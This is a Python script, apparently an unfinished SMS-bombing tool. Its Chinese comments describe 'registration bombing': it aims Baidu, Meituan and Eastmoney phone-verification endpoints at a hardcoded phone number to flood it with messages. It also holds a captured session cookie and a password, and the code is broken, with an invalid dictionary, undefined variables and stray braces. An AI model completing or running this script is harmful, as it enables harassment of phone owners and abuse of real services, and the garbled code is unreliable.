import urllib.request

urls={
    "baidu": #百度注册轰炸
    {
        "Host":r"passport.baidu.com",
        "Referer" : r"https://www.baidu.com/index.php?tn=monline_3_dg",
        "url" : r"https://passport.baidu.com/v2/?regphonecheck&token=38712a457d877a2c3bc0ede1b3bbcd28&tpl=mn&apiver=v3&tt=1458879539272&phone=%s&countrycode=&gid=98F4D8D-9D6D-4012-86C2-445267BD26F7&exchange=0&isexchangeable=1&callback=bd__cbs__xb0ku3" % (number),
    },
    "美团":#美团注册轰炸
    {
        "Host":r"passport.meituan.com",
        "Referer" : r"https://passport.meituan.com/account/unitivesignup?service=www&continue=http%3A%2F%2Fwww.meituan.com%2Faccount%2Fsettoken%3Fcontinue%3Dhttp%253A%252F%252Fwww.meituan.com%252F%253Fsource%253Dwandie%2526urpid%253D8.145888129638.10.0%2526_rdt%253D1%2526utm_campaign%253DAffProg%2526utm_medium%253Dwandie%2526utm_source%253De.firefoxchina.cn%2526utm_content%253De.firefoxchina.cn%25252F%25253Fcachebust%25253D20160321%2526utm_term%253D8.cps.10&mtt=1.index%2Fchangecity.0.0.im789i6q",
        "url":r"https://passport.meituan.com/account/captcha?rnd=0.5828165665628726&mobile=%s" % (number),
    }

    https://xcode.eastmoney.com/V2/verifycode2.ashx?vcodeTarget=18450098280&rnd=1458881817438

}

headers = {
    "Host": Host,
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language":"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
    "Accept-Encoding":"gzip, deflate, br",
    "Referer": Referer,
    "Cookie": Cookie,
    "Connection": "keep-alive",
    "Cache-Control": "max-age=0",
}

#"HOSUPPORT=1; UBI=fi_PncwhpxZ%7ETaJc-G5fLOHpGyuPtxDTMv4; PTOKEN=020e5735bf60938b2aed8a8612eb9376; BAIDUID=29612A74C65C51C4C71D35DA24CDEBE4:FG=1; BIDUPSID=720B3086CBF528CD728942233CE60629; PSTM=1458819402; BDRCVFR[Fc9oatPmwxn]=G01CoNuskzfuh-zuyuEXAPCpy49QhP8; H_PS_PSSID=18286_1428_19289_18240_15895_11778_10632; Hm_lvt_90056b3f84f90da57dc0f40150f005d5=1458879251,1458880159; Hm_lpvt_90056b3f84f90da57dc0f40150f005d5=1458880159"
def hacker(number,passwd):



    }
    urllib.request.urlopen(urls[0])



if __name__=="__main__":
    #在这里填写你要短信轰炸的手机号码
    number = r"18450098280"
    #number = r"18965049619"
    # 注册时大部分网站需要你先填写密码，在这里填写
    passwd = r"ehfr863y(t"
    hacker(number,passwd)

